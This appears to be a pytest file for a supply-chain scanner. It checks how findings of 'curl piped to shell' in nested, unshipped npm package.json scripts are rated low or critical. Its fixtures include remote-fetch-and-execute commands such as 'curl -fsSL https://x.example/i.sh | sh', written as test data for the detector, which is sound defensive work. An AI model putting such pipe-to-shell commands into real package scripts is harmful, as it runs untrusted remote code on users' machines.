"""Precision: a maintainer-only script in a nested package.json the root never ships.

The adversarial set ``tests/adversarial/cases_subpackage_scripts.py`` pins verdicts;
this file pins :func:`unshipped_subpackage`'s edges and the star-import glob fix.
"""

from __future__ import annotations

import json

import pytest

from src.scanner.npm_scripts import MAINTAINER_WHY, restore_externally_invoked, unshipped_subpackage
from src.scanner.scan import _scan_content

PIPE = "curl/wget piped to shell"
SUB = json.dumps({"name": "ext", "private": True,
                  "scripts": {"pretest:e2e": "curl -fsSL https://x.example/i.sh | sh"}})


def _tree(root: dict | None, **extra: str) -> dict[str, str]:
    t = {"ext/package.json": SUB, "lib/index.js": "module.exports = 1;\n"}
    if root is not None:
        t["package.json"] = json.dumps({"name": "cli", "version": "1.0.0", **root})
    t.update(extra)
    return t


@pytest.mark.parametrize("root,extra,want", [
    ({"files": ["lib"]}, {}, True),
    ({"files": ["./lib/", "!ext"]}, {}, True),
    ({"files": ["lib"], "bin": "lib/cli.js", "main": "lib/index.js"}, {}, True),
    # a fixture repo elsewhere declaring workspaces cannot reach ext/
    ({"files": ["lib"]}, {"test/fixtures/ws/package.json": '{"workspaces": ["a"]}'}, True),
    (None, {}, False),
    ({}, {}, False),
    ({"files": ["lib", "ext"]}, {}, False),
    ({"files": ["lib", "./ext/dist"]}, {}, False),
    ({"files": ["**/*.js"]}, {}, False),
    ({"files": ["e*"]}, {}, False),
    ({"files": ["."]}, {}, False),
    ({"files": ["lib"], "main": "ext/index.js"}, {}, False),
    ({"files": ["lib"], "bin": {"x": "./ext/x.js"}}, {}, False),
    ({"files": ["lib"], "workspaces": ["ext"]}, {}, False),
    ({"files": ["lib"]}, {"lerna.json": "{}"}, False),
    ({"files": "lib"}, {}, False),
])
def test_unshipped_subpackage(root, extra, want):
    assert unshipped_subpackage("ext/package.json", _tree(root, **extra)) is want


def test_root_package_is_never_a_subpackage():
    assert not unshipped_subpackage("package.json", _tree({"files": ["lib"]}))


def _marked(texts: dict[str, str]) -> list:
    findings, _p, _s = _scan_content(texts["ext/package.json"], "ext/package.json")
    pipe = [f for f in findings if f.name == PIPE]
    assert pipe and pipe[0].remediation == MAINTAINER_WHY
    restore_externally_invoked(pipe, texts)
    return pipe


SPAWNER = "const cp = require('child_process');\nmodule.exports = (a) => cp.spawn('npm', a);\n"


def test_unshipped_subpackage_ignores_tree_wide_spawner():
    (f,) = _marked(_tree({"files": ["lib"]}, **{"lib/run.js": SPAWNER}))
    assert f.severity == "low"


def test_shipped_subpackage_keeps_tree_wide_spawner():
    (f,) = _marked(_tree({"files": ["lib", "ext"]}, **{"lib/run.js": SPAWNER}))
    assert f.severity == "critical"


def test_star_import_is_not_a_script_glob():
    star = 'import * as path from "node:path";\nexport * from "node:fs";\n'
    (f,) = _marked(_tree({}, **{"lib/a.ts": star}))
    assert f.severity == "low"


def test_real_runner_glob_still_restores():
    glob = 'import * as cp from "node:child_process";\ncp.execSync(\'npx run-p "pretest:*"\');\n'
    (f,) = _marked(_tree({}, **{"lib/a.ts": glob}))
    assert f.severity == "critical"


@pytest.mark.parametrize("bin_", [["lib/cli.js"], 1, True])
def test_bin_that_is_not_string_or_object_is_not_unshipped(bin_):
    assert not unshipped_subpackage("ext/package.json", _tree({"files": ["lib"], "bin": bin_}))


def test_unparseable_root_package_json_is_not_unshipped():
    texts = _tree(None, **{"package.json": '{"name": "cli", "files": ["lib"],'})
    assert not unshipped_subpackage("ext/package.json", texts)


@pytest.mark.parametrize("files,want", [
    (["dist/**/*.js"], True),
    (["lib/sub/*.js"], True),
    (["ext/**/*.js"], False),
    (["ext/dist/*.js"], False),
])
def test_files_glob_after_folder_prefix_compares_the_prefix(files, want):
    assert unshipped_subpackage("ext/package.json", _tree({"files": files})) is want


def test_unshipped_subpackage_ignores_another_packages_hook_files():
    root = {"files": ["lib"],
            "scripts": {"postinstall": "node lib/setup.js",
                        "fetch:dev": "curl -fsSL https://x.example/r.sh | sh"}}
    texts = _tree(root, **{"lib/setup.js": SPAWNER})
    pipe = []
    for path in ("package.json", "ext/package.json"):
        findings, _p, _s = _scan_content(texts[path], path)
        pipe += [f for f in findings if f.name == PIPE]
    assert len(pipe) == 2 and all(f.remediation == MAINTAINER_WHY for f in pipe)
    restore_externally_invoked(pipe, texts)
    sev = {f.file_path: f.severity for f in pipe}
    assert sev["package.json"] == "critical"
    assert sev["ext/package.json"] == "low"


def test_unshipped_subpackage_with_own_hook_file_keeps_spawner_restore():
    sub = json.dumps({"name": "ext", "private": True,
                      "scripts": {"postinstall": "node run.js",
                                  "pretest:e2e": "curl -fsSL https://x.example/i.sh | sh"}})
    texts = _tree({"files": ["lib"]}, **{"ext/package.json": sub, "ext/run.js": SPAWNER})
    (f,) = _marked(texts)
    assert f.severity == "critical"


@pytest.mark.parametrize("line", [
    'import type * as T from "node:path";',
    'export * as fs from "node:fs";',
    'export type * from "node:fs";',
])
def test_star_import_forms_are_not_script_globs(line):
    (f,) = _marked(_tree({}, **{"lib/a.ts": line + "\n"}))
    assert f.severity == "low"


def test_bare_star_after_star_import_on_runner_line_still_restores():
    line = 'export * from "node:fs"; cp.execSync(\'npx run-s "*"\');\n'
    (f,) = _marked(_tree({}, **{"lib/a.ts": line}))
    assert f.severity == "critical"
